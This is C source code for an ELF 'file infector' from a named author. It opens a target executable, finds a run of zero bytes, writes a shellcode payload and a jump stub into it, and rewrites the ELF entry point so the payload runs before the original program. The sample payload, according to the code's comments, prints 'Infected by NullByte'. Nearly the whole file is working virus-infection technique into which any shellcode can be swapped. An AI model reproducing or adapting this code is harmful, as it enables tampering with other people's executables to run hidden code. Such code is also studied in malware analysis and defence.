/*
* File Infector
* Written by: NullByte
* Github: NullByteGTK
* Contact: nullbyteprivilege@gmail.com
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc,char *argv[]){
  FILE *fr; //File handler for opening the file
  unsigned int code_seg = 0; //The starting address of code segment
  char sll[9]; //This is going to be the address of the shellcode in file
  char start[9]; //This will be holding the address of EOP
  unsigned long long shell_addr; //This will be holding the offset of the shellcode from start
  char shellcode[] = {
    0xeb,0x00,0xe8,0x16,0x00,0x00,0x00,0x49,0x6e,0x66,0x65,0x63,0x74,0x65,0x64,0x20,0x42,0x79,0x20,0x4e,0x75,0x6c,0x6c,0x42,0x79,0x74,0x65,0x0d,0x0a,0xb8,0x04,0x00,0x00,0x00,0xbb,0x01,0x00,0x00,0x00,0x59,0xba,0x16,0x00,0x00,0x00,0xcd,0x80
  }; //The shellcode you want to run (This shellcode will print "Infected by NullByte" Length: 47)
  char jump_main[] = {0x48,0xc7,0xc0,0x00,0x00,0x00,0x00,0xff,0xe0}; //A simple shellcode for jumping to _start after executing the shellcode above (Length: 9)
  /*
  mov eax,address_of_"_start"_function
  jmp eax
  */
  unsigned int shellcode_size = 47;//Length of your shellcode
  unsigned int ret_size = 9;//Length of jump_main
  unsigned int shellsize = ret_size+shellcode_size;
  unsigned int ind = 0; //Counter for writing to start


  if(argc < 2){
    printf("Usage: %s [target file]\n",argv[0]);
    return 0;
  }

  fr = fopen(argv[1],"r+b"); //Open the file for binary read & write
  char elf[5] = {fgetc(fr),fgetc(fr),fgetc(fr),fgetc(fr),0x00};
  char s_elf[5] = {0x7f,0x45,0x4c,0x46,0x00};
  
  if(strcmp(elf,s_elf)){ //Checks to see if the file is an ELF binary or not (This check is really unreliable though xD)
    printf("The file is not an ELF binary\n");
    exit(0);
  }

  unsigned int ar = fgetc(fr);
  if(ar == 1){ //The file is a 32bit ELF binary
    code_seg = 134512640;
  }else if(ar == 2){ //The file is a 64bit ELF binary
    code_seg = 4194304;
  }else{
    printf("The file is neither 64bit nor 32bit\n");
    exit(0);
  }

  fseek(fr,5,SEEK_SET);
  if(fgetc(fr) != 1){ //Checks to see if the file is an executable ELF Binary or not
    printf("Big endian is not supported yet ;(\n");
    exit(0);
  }

  fseek(fr,16,SEEK_SET);
  if(fgetc(fr) != 2){ //Checks to see if the file is an executable ELF Binary or not
    printf("The file is not an executable ELF binary");
    exit(0);
  }

  fseek(fr,0,SEEK_END); //Gets the size of the file
  unsigned long long sz = ftell(fr);
  
  fseek(fr,24,SEEK_SET); //Goto EPA (EPA is at offset 24 from the start of file) (EPA: Entry Point Address)


  //Copy EPA to start
  sprintf(&start[ind],"%02x",(unsigned char)fgetc(fr));
  ind += 2;
  sprintf(&start[ind],"%02x",(unsigned char)fgetc(fr));
  ind += 2;
  sprintf(&start[ind],"%02x",(unsigned char)fgetc(fr));
  ind += 2;
  sprintf(&start[ind],"%02x",(unsigned char)fgetc(fr));
  
  //replace chars with their hexadecimal value (ex: a (97 in ASCII) => (a-97)+10 = 10 which is 'a' in hexadecimal)
  for(int i=0;i<8;i++){
    if(start[i]-96 > 0){
      start[i] = 10+(start[i]-97);
    }else{
      start[i] -= 48;
    }
  }

  int fail = 0; //A flag for knowing whether we have found a suitable code cave or not
  unsigned int place = (start[1] + start[0]*16 + start[3]*256 + start[2]*4096 + start[5]*65536 + start[4]*1048576 + start[7]*16777216 + start[6]*268435456) - code_seg; //Calculates the address of '_start' function
  //The following for loop tries to find a suitable code cave for our shellcode
  for(unsigned long long i=place;i<sz;i++){
    fseek(fr,i,SEEK_SET);
    if(sz-i <= shellsize)
      break;
    fail = 0;
    for(unsigned int ms=0;ms<shellsize;ms++){
      if((unsigned)fgetc(fr) != 0x00){
        fail = 1;
        break;
      }
    }
    if(!fail){
      shell_addr = i;
      break;
    }
  }

  //jump_main (the shellcode which will jump to _start after executing the main shellcode) is going to contain the _start function's address
  jump_main[3] = start[1] + start[0]*16;
  jump_main[4] = start[3] + start[2]*16;
  jump_main[5] = start[5] + start[4]*16;
  jump_main[6] = start[7] + start[6]*16;

  fseek(fr,shell_addr,SEEK_SET); //Goto code cave
  
  //inserts shellcode into the code cave
  for(unsigned int lk=0;lk<shellcode_size;lk++){
  fputc(shellcode[lk],fr);
  }
  for(unsigned int lk=0;lk<ret_size;lk++){
  fputc(jump_main[lk],fr);
  }

  sprintf(sll,"%08x",(unsigned long long)(code_seg+shell_addr)); //sll now contains the address of the shellcode
  //replace chars with their hexadecimal value (ex: a (97 in ASCII) => (a-97)+10 = 10 which is 'a' in hexadecimal)
  for(int i=0;i<8;i++){ 
    if(sll[i]-96 > 0){
      sll[i] = 10+(sll[i]-97);
    }else{
      sll[i] -= 48;
    }
  }

  //The following code replaces the EPA with the address of the shellcode
  fseek(fr,24,SEEK_SET);
  fputc(sll[7] + sll[6]*16,fr);
  fputc(sll[5] + sll[4]*16,fr);
  fputc(sll[3] + sll[2]*16,fr);
  fputc(sll[1] + sll[0]*16,fr);
  fclose(fr);
  printf("Done\n");
  return 0;
}
